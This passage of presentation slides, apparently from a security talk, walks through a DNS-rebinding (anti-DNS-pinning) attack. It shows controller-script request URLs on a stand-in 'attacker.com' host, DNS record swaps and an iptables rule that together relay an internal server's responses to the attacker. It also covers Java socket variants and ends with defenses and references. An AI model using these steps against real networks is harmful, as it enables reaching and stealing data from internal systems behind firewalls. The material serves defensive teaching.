and a DNS record pointing at the attack web server’s secondary IP 
address. 
Attack 
workstation
Victim 
workstation
Attack Server
addrecord A fkduia.attacker.com 12.0.0.81
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
XSS Infected 
Server
10. The victim browser, polls the controller script and recieves a 
command to create a new iframe. 
Attack Server
http://12.0.0.80/cgi-bin/controller.pl?command=poll&sessionid=10
Victim 
workstation
Attack 
workstation
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
XSS Infected 
Server
11. The iframe source points to the random hostname and the 
controller script.
Attack Server
http://fkduia.attacker.com/cgi-bin/controller.pl? 
command=getproxyiframe&sessionid=10
Victim 
workstation
Attack 
workstation
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
XSS Infected 
Server
12. Once the iframe loads on the victim browser, it notifies the 
attack web server with an image request.
Attack Server
http://12.0.0.80/cgi-bin/controller.pl?command=iframeloaded 
&sessionid=10&proxyid=3
Victim 
workstation
Attack 
workstation
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
XSS Infected 
Server
13. The controller script adds a firewall rule to block the victim from 
reaching its secondary IP address, and then changes the DNS 
record to point at the targeted server.
Attack Server
iptables -A INPUT -p tcp –d 12.0.0.81/32 --dport 80 –j DROP 
addrecord A fkduia.attacker.com 10.0.0.30
Attack 
workstation
Victim 
workstation
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
XSS Infected 
Server
14. The iframe retrieves the next proxied HTTP request from the 
attack web server’s primary IP address.
Attack Server
http://12.0.0.80/cgi-bin/controller.pl?command=getnextrequest 
&sessionid=10&proxyid=3
Attack 
workstation
Victim 
workstation
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
XSS Infected 
Server
15. The iframe creates an XMLHTTPRequest object, pointing it at 
the supplied URL. The web browser attempts to connect to the 
cached IP address, but fails due to the firewall rule. 
Attack Server
http://fkduia.attacker.com/cgi-bin/controller.pl? 
command=getnextrequest&sessionid=10&proxyid=3
Attack 
workstation
Victim 
workstation
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
XSS Infected 
Server
16. It continues to retry until it reaches its timeout threshold, then 
dumps its cache and requeries the attack DNS server. The DNS 
server responds with the targeted server IP address.
Attack Server
query 
fkduia.attacker.com 
response 10.0.0.30
Attack 
workstation
Victim 
workstation
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Windows Server
XSS Infected 
Server
17. The XMLHTTPRequest object in the iframe connects to the 
targeted web server, and issues the request.
http://fkduia.attacker.com/
Attack 
workstation
Victim 
workstation
Attack Server
Linux Server
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
XSS Infected 
Server
18. The iframe sends a message to the controller script via image 
request, indicating that the firewall rule can be disabled. 
Attack Server
http://12.0.0.80/cgi-bin/controller.pl?command=antipincomplete 
&sessionid=10&proxyid=3
Attack 
workstation
Victim 
workstation
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
XSS Infected 
Server
19. The HTTP response is put into form fields, and posted back to 
the controller script on the attack web server’s primary IP address.
Attack Server
POST http://12.0.0.80/cgi-bin/controller.pl 
command=postdata&sessionid=10&proxyid=3&response=Internal...
Attack 
workstation
Victim 
workstation
Corporate 
10.0.0.0/24
Internet 
12.0.0.0/24
Demonstration Sequence
Linux Server
Windows Server
XSS Infected 
Server
20. The controller script inserts the response into the database. The 
proxy server sees the response and sends it back to the attacker’s 
browser
Attack Server
HTTP/1.1 200 OK 
Content-Type: text/html 
...
Victim 
workstation
Attack 
workstation
Anti-DNS Pinning Demonstration: 
JavaScript & XMLHTTPRequest
Limitations & Techniques
• Lack of host header control only allows access to the 
default website
• HOST HEADERS ARE NOT SECURITY
• REFERAL HEADERS ARE NOT SECURITY
• Find a web server with secondary vulnerabilities
• Complicated attacks like chunked encoding not 
possible
• SQL Injection ideal
• Tertiary flaw such as xp_cmdshell can be used to 
start more flexible and traditional tunneling
• Java allows for more sophisticated techniques
Java Security Refresher
• Two kinds of applets: trusted & untrusted
• Trusted are either digitally signed, or installed 
locally
– Local file access
– Process creation & termination
– Unlimited network access (listen & connect)
• Everything else is untrusted
– No file access
– No process management
– Only outbound socket access to origin server
LiveConnect
• Origins in the Netscape Plugin Application 
Programming Interface (NPAPI) from 
Navigator 4.0
• Two way bridge between Java applets & 
JavaScript
• JavaScript can instantiate Java objects
• Java applets can access the HTML DOM of 
the host page
• Supported by Firefox and Opera, but not IE
Java & DNS Pinning
• Sun’s JVM has its own DNS resolver and pinning logic and is 
not known to be vulnerable to standard attacks
• Martin Johns & Kanatoko documented that if JavaScript creates 
a Java socket object back to the document’s origin server, the 
JVM will immediately query DNS 
• If the attacker has already changed the DNS record for the 
origin server, the JVM will connect the socket to any IP address
• Improvements over XMLHTTPRequest
– No delay caused by DNS cache timeouts
– Direct socket access removes HTTP host header limitation
– Both text and binary protocols possible
– Full TCP & UDP support by Java classes
– Limited ICMP support
– Huge potential: Telnet, SSH, SNMP, database protocols, SMB, etc
Java-based Attack 
Demonstration
• Very similar to JavaScript technique
• SOCKS proxy for the attacker instead of HTTP
• Hummingbird generic SOCKS client used by the 
attacker
• No need for firewall, or delay in DNS changes
• Uses java.nio.channels.SocketChannel
• Socket reads & writes handled asynchronously with 
separate JavaScript execution paths (pseudo- 
threads)
• Port scanning easy and fast
Anti-DNS Pinning Demonstration: 
Java & LiveConnect
Defense – Browser Pinning
• Most obvious is to change browser to permanently 
pin their cache
• Won’t address browser-restart attacks
• Won’t stop attacks using browser plug-ins
– Java
– Flash (Has limited socket functions, but doesn’t use any 
DNS pinning)
– ActiveX controls
– Plenty more niche plug-ins
• Unused when HTTP proxy servers are used
– DNS pinning on a proxy server impractical
– If firewall filters are bad, proxies can be used to target web 
servers at the very least. Probably any TCP protocol with the 
CONNECT command
Defense – 
Browser Security Policies
• Increased granularity of IE security 
zones (XMLHTTPRequest)
• NoScript can provide some benefit on 
Firefox, but offers little granularity
• Add security zones to Firefox
Defense – Other Ideas
• Completely disabling JavaScript isn’t practical 
at most companies; disabling Java applets 
may be possible
• Security gateways can filter web content, 
heavy administration overhead
• LocalRodeo
– Justus Winter and Martin Johns wrote a Firefox 
add-on to address JavaScript security
– Detects and blocks IP address changes in the 
browser’s DNS cache
– Still experimental / beta
– Doesn’t address other plug-ins or proxy servers
Defense – 
More Internal Attention
• Running code that is anonymously downloaded from the 
Internet may get safer, but will never be safe
• Other techniques exist to bypass perimeter firewalls
• Most companies have a hard, crunchy shell, with a soft, juicy 
center
• Don’t rely solely on network firewalls & NIDS
• More advanced techniques
– Harden all servers, not just the ones in the DMZ
– Network segmentation; don’t allow John Doe in the call center to 
SSH into a router. Does he even need Internet & email access?
– Use strong protocols whenever possible: SSH, SSL, IPSec
– Application firewalls
– If you have a surplus of money; NIPS, HIPS, WIDS, etc
Questions
References
http://www.mozilla.org/projects/security/components/same- 
origin.html
http://www.ietf.org/rfc/rfc2616.txt, section 15.3
http://viper.haque.net/~timeless/blog/11/
http://shampoo.antville.org/stories/1451301/
http://msdn2.microsoft.com/en-us/library/ms175046.aspx
http://www.cgisecurity.com/lib/XmlHTTPRequest.shtml
https://bugzilla.mozilla.org/show_bug.cgi?id=297078
https://bugzilla.mozilla.org/show_bug.cgi?id=302263
http://www.w3.org/TR/html401/present/frames.html#h-16.5
http://www.w3.org/TR/XMLHttpRequest/
http://msdn2.microsoft.com/en-us/library/ms535874.aspx
http://developer.mozilla.org/en/docs/XMLHttpRequest
http://mgran.blogspot.com/2006/08/downloading-binary-streams- 
with.html
http://www.gnucitizen.org/projects/backframe/
http://www.bobbyvandersluis.com/articles/dynamicCSS.php
http://www.irt.org/articles/js065/
http://java.sun.com/sfaq/
http://shampoo.antville.org/stories/1566124/
http://developer.mozilla.org/en/docs/LiveConnect
http://java.sun.com/products/plugin/1.3/docs/jsobject.html
http://java.sun.com/j2se/1.5.0/docs/api/java/net/DatagramSocket 
.html
http://java.sun.com/j2se/1.5.0/docs/api/java/net/Socket.html
http://java.sun.com/j2se/1.5.0/docs/api/java/net/InetAddress.html 
#isReachable(int)
http://tools.ietf.org/html/rfc1928
http://www.hummingbird.com/products/nc/socks/index.html
http://developer.mozilla.org/en/docs/DOM:window.setTimeout
http://developer.mozilla.org/en/docs/DOM:window.setInterval
http://www.jumperz.net/index.php?i=2&a=3&b=3
http://www.adobe.com/support/flash/action_scripts/actionscript_ 
dictionary/actionscript_dictionary867.html
http://www.mozilla.org/projects/security/components/ConfigPolic 
y.html
http://noscript.net/
http://databasement.net/labs/localrodeo/